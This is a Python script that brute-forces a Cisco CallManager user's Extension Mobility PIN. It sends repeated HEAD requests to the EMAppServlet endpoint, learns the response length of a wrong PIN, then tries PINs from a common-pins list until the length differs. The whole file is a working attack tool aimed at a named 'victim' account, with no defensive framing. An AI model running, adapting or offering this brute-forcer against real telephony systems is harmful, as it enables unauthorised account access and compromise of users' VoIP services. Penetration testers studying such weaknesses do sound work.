#!/usr/bin/python

# This script uses Extension Mobility (in Cisco CallManager) to bruteforce a VoIP 
# user's pin. It only checks for a list of more common pins (mainly 4 digits long),
# but you can generate your own list.
# Written by t4

import sys
import requests

print "#########################################################"
print "# User PIN Bruteforcer using Extension Mobility in CUCM #"
print "#########################################################"
print ""

if len(sys.argv) != 2:
	print "Usage: python %s username" % (sys.argv[0])
	sys.exit()

with open("commonpins") as f:
    pins = f.readlines()

# You can manually set the Call Manager's IP below to avoid repitition
cucmip=""

if (cucmip == ""):
	cucmip = raw_input("Please enter the IP/Hostname of the Cisco CallManager: ")

print "Call Manager IP/Hostname: %s" % (cucmip)
print "Victim Username: %s" % (sys.argv[1])

data = []
for i in range(1231092412, 1231092419):
	# This loop is there to find the content length of a wrong pin
	r = requests.head("http://"+cucmip+":8080/emapp/EMAppServlet?device=abc&userid="+str(sys.argv[1])+"&seq="+str(i))
	data.append(str(r.headers['Content-Length']))

i = 1
while i < len(data):
	# This just checks to make sure that the content lengths of the test cases are the same
	if data[i] != data[i-1]:
		print "This script is confused\nExiting..."
		sys.exit()
	else:
		wrongsize = data[i]
	i+=1

print "Wrong size: %s" % (wrongsize)

for i in pins:
  # This final loop attempts to login a user to a device named "abc" with different common pins
  # It uses difference in response content-length to determine the correct pin
	r = requests.head("http://"+cucmip+":8080/emapp/EMAppServlet?device=abc&userid="+str(sys.argv[1])+"&seq="+str(i).strip('\n'))
	if int(r.headers['Content-Length']) == int(wrongsize):
		print "TRYING: pin: %s, response length: %s" % (str(i).strip('\n'), str(r.headers['Content-Length']))
	else:
		print "FOUND: pin: %s, response length: %s" % (str(i).strip('\n'), str(r.headers['Content-Length']))
		sys.exit()
